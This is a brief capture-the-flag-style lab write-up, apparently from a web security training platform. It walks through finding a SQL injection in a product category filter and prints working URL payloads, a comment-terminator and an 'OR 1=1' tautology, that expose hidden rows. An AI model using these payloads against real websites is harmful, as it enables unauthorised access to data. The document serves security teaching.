# SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:

```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

To solve the lab, perform a SQL injection attack

When the buttons are clicked it is filtered by category and this is done with a GET request:

Find the SQL Vulnerability exsist or not, with using " ' "(/filter?category=Gifts'):

Using the following payload we get 4 items instead of only 3, because it shows both the released and the hidden one:

```
/filter?category=Gifts'-- 
```

To show all values we add OR 1=1 to display all categories:

```
/filter?category=Gifts'+OR+1=1--
```
